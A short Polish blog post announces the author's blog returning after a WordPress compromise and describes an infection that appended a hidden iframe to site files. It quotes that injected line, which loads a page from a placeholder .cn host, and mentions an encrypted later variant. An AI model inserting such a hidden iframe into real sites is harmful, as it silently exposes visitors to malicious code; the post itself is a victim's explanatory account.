--- 
layout: plpost
title: "Wordpress 2.8.5, powr\xC3\xB3t, o infekcji s\xC5\x82\xC3\xB3w kilka"
categories: [polish, wordpress]
wordpress_id: 219
wordpress_url: http://kwpolska.co.cc/?p=219
---
**Nie tylko o powrocie bloga. Informacje o Ruskiej infekcji ramkowej (.cn).** 
Po kilkudniowej nieobecności spowodowanej Ruską Infekcją Ramkową blog powraca do życia. Wszystkie wpisy wróciły na swoje miejsca, blog zmienił wygląd. Sam silnik został zaktualizowany do wersji 2.8.5. Ale to nie jest najważniejsza część wpisu.

Infekcja schowanej ramki, ochrzczona przeze mnie jako **Ruska Infekcja Ramkowa** zmieniła się. Zaczęło się od wirusa edytującego wszystkie pliki .php, .html, .phpX, .shtml, .phtml i wiele więcej w celu doklejenia ramki:

`<iframe src="http://X.cn/img/index.php" style="display: none;" />` 
Tej wersji zapobiegało się bardzo prosto - wystarczyło czyszczenie plików ręcznie (lub przywrócenie z backupu) i komputera. Infekcja była groźna wszędzie i wszędzie miała taki sam charakter. Przeglądarki jednakże blokują złośliwy kod. Następna wersja jest już gorsza. Infekcję rozpoznają mądrzejsze przeglądarki. Kod HTML zaczyna się od

`/* Warning: Opera Only */` 
- potem znajdował się zaszyfrowany skrypt. Miał on po rozszyfrowaniu taką samą postać, jak listing 1, ale jego jedyną drogą rozprzestrzeniania się był nie tylko schemat A (KTÓRY ZABRALI), infekcja na mój serwer dostała się przez exploit (lukę). Co z wirusem będzie dalej okaże się w najbliższej przyszłości.
